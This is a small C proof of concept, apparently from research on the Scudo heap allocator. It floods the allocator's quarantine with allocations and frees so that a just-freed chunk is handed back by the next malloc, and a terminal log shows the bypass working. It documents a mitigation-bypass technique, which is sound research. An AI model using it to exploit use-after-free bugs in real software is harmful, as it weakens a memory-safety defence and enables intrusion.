#include <stdio.h>

void populate(){
	for(int i=0; i<0x1000; i++){
		free(malloc(0x20+i)); // avoid freeing same sized chunks
	}
}
int main(){
	char *ptr_we_like = malloc(0x10);
	free(ptr_we_like);
	// At this point there is no chance a next malloc(0x10)
	// will return the same pointer since it is quarantined.
	// But let's see what happens if we populate the quarantine;
	
	populate();
	if(malloc(0x10)==ptr_we_like) printf("[+] The chunk returned is the same!\n");
	
}
/***
oof@220:~/scudo_research$ ./poc
[+] The chunk returned is the same!
***/
